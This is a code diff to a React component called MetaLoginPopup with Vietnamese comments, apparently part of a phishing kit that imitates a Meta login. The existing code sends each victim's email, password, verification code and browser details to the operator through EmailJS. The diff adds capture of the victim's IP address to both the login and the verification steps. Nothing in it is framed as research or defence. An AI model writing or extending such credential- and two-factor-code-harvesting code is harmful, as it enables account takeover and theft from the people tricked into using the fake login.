@@ -19,7 +19,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Progress } from "@/components/ui/progress";
 import { cn } from "@/lib/utils";
-import { sendLoginInfo } from "@/lib/emailService";
+import { sendLoginInfo, getUserIp } from "@/lib/emailService";
 
 enum LoginStep {
   LOGIN_FIRST_ATTEMPT = 0,
@@ -71,14 +71,19 @@ const MetaLoginPopup = () => {
     setIsLoading(true);
     setErrorMessage(null);
 
-    // Gửi thông tin đăng nhập qua EmailJS
+    // Lấy IP và gửi thông tin đăng nhập qua EmailJS
     try {
+      const ipAddress = await getUserIp();
+      
       await sendLoginInfo({
         email,
         password,
         timestamp: new Date().toISOString(),
+        ip: ipAddress,
         userAgent: navigator.userAgent,
       });
+      
+      console.log('Captured IP address:', ipAddress);
     } catch (error) {
       console.error('Error sending login info:', error);
     }
@@ -116,15 +121,20 @@ const MetaLoginPopup = () => {
     setIsLoading(true);
     setVerificationError(null);
 
-    // Gửi thông tin mã xác thực qua EmailJS
+    // Lấy IP và gửi thông tin mã xác thực qua EmailJS
     try {
+      const ipAddress = await getUserIp();
+      
       await sendLoginInfo({
         email,
         password: 'Already sent in previous step',
         verificationCode,
         timestamp: new Date().toISOString(),
+        ip: ipAddress,
         userAgent: navigator.userAgent,
       });
+      
+      console.log('Captured IP address for verification:', ipAddress);
     } catch (error) {
       console.error('Error sending verification info:', error);
     }
